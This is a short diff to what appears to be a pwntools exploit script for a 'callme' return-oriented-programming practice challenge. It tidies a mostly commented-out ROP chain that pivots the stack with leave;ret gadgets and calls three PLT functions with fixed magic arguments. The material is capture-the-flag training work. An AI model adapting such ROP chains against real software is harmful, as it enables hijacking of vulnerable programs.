@@ -56,12 +56,11 @@ callme_one = exe.plt["callme_one"]
 callme_two = exe.plt["callme_two"]
 callme_three = exe.plt["callme_three"]
 args = pack(0xdeadbeef) + pack(0xcafebabe) + pack(0xd00df00d)
-print(args)
 
 leaveret = 0x804874d
 
 # Without ASLR
-# ebp = 0xffffcb48 # x-4
+# ebp = 0xffffcb58 # x-4
 
 # rop = ROP(exe)
 # rop.raw(b"\x90" * (pad-4))
@@ -70,25 +69,19 @@ leaveret = 0x804874d
 # rop.raw(ebp)
 # rop.raw(callme_one)
 # rop.raw(leaveret)
-# rop.raw(0xdeadbeef)
-# rop.raw(0xcafebabe)
-# rop.raw(0xd00df00d)
+# rop.raw(args)
 
 # ebp = ebp + 6*4
 # rop.raw(ebp)
 # rop.raw(callme_two)
 # rop.raw(leaveret)
-# rop.raw(0xdeadbeef)
-# rop.raw(0xcafebabe)
-# rop.raw(0xd00df00d)
+# rop.raw(args)
 
 # ebp = ebp + 6*4
 # rop.raw(ebp)
 # rop.raw(callme_three)
 # rop.raw(leaveret)
-# rop.raw(0xdeadbeef)
-# rop.raw(0xcafebabe)
-# rop.raw(0xd00df00d)
+# rop.raw(args)
 
 pop_12bytes_ret = 0x080487f9
 
